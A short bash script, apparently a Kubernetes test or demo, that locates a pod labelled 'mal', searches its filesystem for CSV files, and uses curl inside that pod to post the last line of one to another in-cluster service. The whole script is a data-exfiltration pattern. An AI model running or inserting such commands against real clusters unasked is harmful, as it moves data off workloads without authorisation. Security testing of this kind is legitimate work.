#!/bin/bash
POD=$(kubectl get pod -l app=mal -o name)
POD=${POD:4:${#POD}}
kubectl exec $POD -- curl -d '{"line": "'"$(kubectl exec $POD -- tail -n 1 $(kubectl exec $POD -- find / -name *.csv))"'"}' -H 'Content-Type: application/json' http://tk.default:80/